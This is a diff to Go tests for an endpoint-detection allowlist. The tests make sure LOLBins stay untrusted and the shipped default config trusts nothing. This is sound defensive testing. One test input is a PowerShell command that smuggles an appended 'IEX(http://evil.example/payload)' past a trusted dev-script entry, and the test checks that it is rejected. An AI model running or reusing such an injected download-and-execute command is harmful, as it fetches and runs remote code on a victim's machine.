@@ -1,11 +1,13 @@
 package allowlist
 
 import (
+	"encoding/json"
 	"net"
 	"os"
 	"path/filepath"
 	"regexp"
 	"runtime"
+	"slices"
 	"testing"
 
 	"sentinel/internal/event"
@@ -319,13 +321,13 @@ func TestCmdLineInDevScripts(t *testing.T) {
 // which silently disabled EVERY behavior rule (EXEC-001, PERSIST-001, EVADE-001,
 // CRED-002, INJECT-*) for the exact LOLBin actors the incident used. The
 // --self-test passed because it uses its own embedded allowlist; this test loads
-// the REAL config/allowlist.json and asserts the LOLBins stay untrusted while
+// the REAL config/allowlist.json.example and asserts the LOLBins stay untrusted while
 // benign Windows binaries remain trusted (so NET-002 stays quiet).
 //
 // If this test fails, someone re-added a broad System32 glob (or added a LOLBin
 // to the benign list) - review before committing.
 func TestProductionAllowlistDoesNotTrustLOLBins(t *testing.T) {
-	// Locate config/allowlist.json by walking up from this test file.
+	// Locate config/allowlist.json.example by walking up from this test file.
 	_, file, _, ok := runtime.Caller(0)
 	if !ok {
 		t.Fatal("runtime.Caller failed")
@@ -333,7 +335,7 @@ func TestProductionAllowlistDoesNotTrustLOLBins(t *testing.T) {
 	dir := filepath.Dir(file)
 	var prodPath string
 	for i := 0; i < 6; i++ {
-		cand := filepath.Join(dir, "config", "allowlist.json")
+		cand := filepath.Join(dir, "config", "allowlist.json.example")
 		if _, err := os.Stat(cand); err == nil {
 			prodPath = cand
 			break
@@ -341,7 +343,7 @@ func TestProductionAllowlistDoesNotTrustLOLBins(t *testing.T) {
 		dir = filepath.Dir(dir)
 	}
 	if prodPath == "" {
-		t.Skip("config/allowlist.json not found (running outside repo root)")
+		t.Skip("config/allowlist.json.example not found (running outside repo root)")
 	}
 
 	a, err := Load(prodPath)
@@ -389,7 +391,7 @@ func TestProductionAllowlistDoesNotTrustLOLBins(t *testing.T) {
 }
 
 // TestProductionAllowlistDevTuning pins the operator's FP-tuning entries against
-// the REAL config/allowlist.json: pi-lite in dev_tool_paths (quiets NET-002/003
+// the REAL config/allowlist.json.example: pi-lite in dev_tool_paths (quiets NET-002/003
 // for the operator's dev AI agent) and pe-triage-docker.ps1 in dev_scripts
 // (quiets EXEC-001 for the operator's own PS-bypass dev workflow). These are
 // the two known false positives surfaced during on-host use. If the entries are
@@ -406,7 +408,7 @@ func TestProductionAllowlistDevTuning(t *testing.T) {
 	dir := filepath.Dir(file)
 	var prodPath string
 	for i := 0; i < 6; i++ {
-		cand := filepath.Join(dir, "config", "allowlist.json")
+		cand := filepath.Join(dir, "config", "allowlist.json.example")
 		if _, err := os.Stat(cand); err == nil {
 			prodPath = cand
 			break
@@ -414,7 +416,7 @@ func TestProductionAllowlistDevTuning(t *testing.T) {
 		dir = filepath.Dir(dir)
 	}
 	if prodPath == "" {
-		t.Skip("config/allowlist.json not found (running outside repo root)")
+		t.Skip("config/allowlist.json.example not found (running outside repo root)")
 	}
 	a, err := Load(prodPath)
 	if err != nil {
@@ -463,7 +465,7 @@ func TestProductionAllowlistDevTuning(t *testing.T) {
 // The fix prepends a drive-root anchor to each path pattern: NormalizePath
 // always emits "<drive-letter>:\...", so the anchor pins the match to the
 // drive root and the trusted substring can no longer appear mid-path in a
-// user-writable location. This test loads the REAL config/allowlist.json and
+// user-writable location. This test loads the REAL config/allowlist.json.example and
 // asserts both halves: cross-directory substring mimics must be UNtrusted,
 // while legit install paths stay trusted.
 //
@@ -492,7 +494,7 @@ func TestProductionAllowlistDriveRootAnchored(t *testing.T) {
 	dir := filepath.Dir(file)
 	var prodPath string
 	for i := 0; i < 6; i++ {
-		cand := filepath.Join(dir, "config", "allowlist.json")
+		cand := filepath.Join(dir, "config", "allowlist.json.example")
 		if _, err := os.Stat(cand); err == nil {
 			prodPath = cand
 			break
@@ -500,7 +502,7 @@ func TestProductionAllowlistDriveRootAnchored(t *testing.T) {
 		dir = filepath.Dir(dir)
 	}
 	if prodPath == "" {
-		t.Skip("config/allowlist.json not found (running outside repo root)")
+		t.Skip("config/allowlist.json.example not found (running outside repo root)")
 	}
 	a, err := Load(prodPath)
 	if err != nil {
@@ -559,7 +561,7 @@ func TestProductionAllowlistDriveRootAnchored(t *testing.T) {
 }
 
 // TestProductionSeedsQuietLocalLLMAndDevPaths pins the 2026-09-08 noise seeds
-// against the REAL config/allowlist.json: llama-server's fixed loopback ports
+// against the REAL config/allowlist.json.example: llama-server's fixed loopback ports
 // (:8001/:1234 — 44/46 NET-005 hits 09-03→09-08 were cursor/python polling
 // the local LLM API), the winget llama-server dev_tool_paths entry (NET-004),
 // the widened go-build temp-binary pattern (govulncheck), git's ls.exe in
@@ -574,7 +576,7 @@ func TestProductionSeedsQuietLocalLLMAndDevPaths(t *testing.T) {
 	dir := filepath.Dir(file)
 	var prodPath string
 	for i := 0; i < 6; i++ {
-		cand := filepath.Join(dir, "config", "allowlist.json")
+		cand := filepath.Join(dir, "config", "allowlist.json.example")
 		if _, err := os.Stat(cand); err == nil {
 			prodPath = cand
 			break
@@ -582,7 +584,7 @@ func TestProductionSeedsQuietLocalLLMAndDevPaths(t *testing.T) {
 		dir = filepath.Dir(dir)
 	}
 	if prodPath == "" {
-		t.Skip("config/allowlist.json not found (running outside repo root)")
+		t.Skip("config/allowlist.json.example not found (running outside repo root)")
 	}
 	a, err := Load(prodPath)
 	if err != nil {
@@ -643,5 +645,75 @@ func TestProductionSeedsQuietLocalLLMAndDevPaths(t *testing.T) {
 	// flagged by the 2026-09-08 post-change review).
 	if a.CmdLineInDevScripts(`powershell -ExecutionPolicy Bypass -Command "$env:OUTPUT_DIR='C:\Users\ju\Documents\Github\pe_triage\output\demo_pcode'; & '.\scripts\pe-triage-docker.ps1'; IEX(http://evil.example/payload)"`) {
 		t.Error("trailing '; IEX(...)' must NOT match the -Command entry (executes in -Command context)")
+	}
+}
+
+// TestShippedDefaultAllowlistTrustsNothing pins the shipped posture: the
+// tracked config/allowlist.json is EMPTY — every trust/noise section empty,
+// only the pinned universal network CIDRs — so no per-machine tuning ships
+// with the repo. The worked sample lives in config/allowlist.json.example;
+// per-box live tuning lives in the gitignored config/allowlist.json.local
+// (install-task.ps1 passes -allowlist for it).
+//
+// This is the tripwire, and it asserts STRUCTURALLY (raw JSONC document, not
+// behavior probes): committing personal entries of ANY shape — trusted paths,
+// hashes, signers, loopback listeners, dev paths/scripts, log filters,
+// capture patterns, or an extra CIDR — fails here. Move them to
+// config/allowlist.json.local (or the example) instead.
+func TestShippedDefaultAllowlistTrustsNothing(t *testing.T) {
+	_, file, _, ok := runtime.Caller(0)
+	if !ok {
+		t.Fatal("runtime.Caller failed")
+	}
+	dir := filepath.Dir(file)
+	var defPath string
+	for i := 0; i < 6; i++ {
+		cand := filepath.Join(dir, "config", "allowlist.json")
+		if _, err := os.Stat(cand); err == nil {
+			defPath = cand
+			break
+		}
+		dir = filepath.Dir(dir)
+	}
+	if defPath == "" {
+		t.Skip("config/allowlist.json not found (running outside repo root)")
+	}
+	raw, err := os.ReadFile(defPath)
+	if err != nil {
+		t.Fatalf("read shipped default: %v", err)
+	}
+	var doc rawDoc
+	if err := json.Unmarshal(stripJSONC(raw), &doc); err != nil {
+		t.Fatalf("shipped default must parse as JSONC: %v", err)
+	}
+	sections := []struct {
+		name string
+		n    int
+	}{
+		{"trusted_binaries.sha256", len(doc.TrustedBinaries.SHA256)},
+		{"trusted_binaries.path", len(doc.TrustedBinaries.Path)},
+		{"trusted_binaries.hash_gated_path", len(doc.TrustedBinaries.HashGatedPath)},
+		{"trusted_binaries.allowed_signers", len(doc.TrustedBinaries.AllowedSigners)},
+		{"known_loopback_listeners", len(doc.KnownLoopbackListeners)},
+		{"dev_tool_paths.path", len(doc.DevToolPaths.Path)},
+		{"dev_scripts", len(doc.DevScripts)},
+		{"event_log_filter", len(doc.EventLogFilter)},
+		{"file_capture.patterns", len(doc.FileCapture.Patterns)},
+	}
+	for _, s := range sections {
+		if s.n != 0 {
+			t.Errorf("shipped default %s must be empty (got %d entries) — personal tuning belongs in config/allowlist.json.local, not the tracked default", s.name, s.n)
+		}
+	}
+	wantCIDR := []string{"127.0.0.0/8", "::1/128", "10.0.0.0/8", "192.168.0.0/16", "172.16.0.0/12",
+		"169.254.0.0/16", "fe80::/10", "224.0.0.0/4", "ff00::/8"}
+	if !slices.Equal(doc.AllowedDestinations.CIDR, wantCIDR) {
+		t.Errorf("shipped default allowed_destinations.cidr must stay the pinned universal set\ngot  %v\nwant %v",
+			doc.AllowedDestinations.CIDR, wantCIDR)
+	}
+	// The file must also survive the REAL loader (comment stripping + full
+	// compile), not just encoding/json.
+	if _, err := Load(defPath); err != nil {
+		t.Fatalf("shipped default must load via Load(): %v", err)
 	}
 }
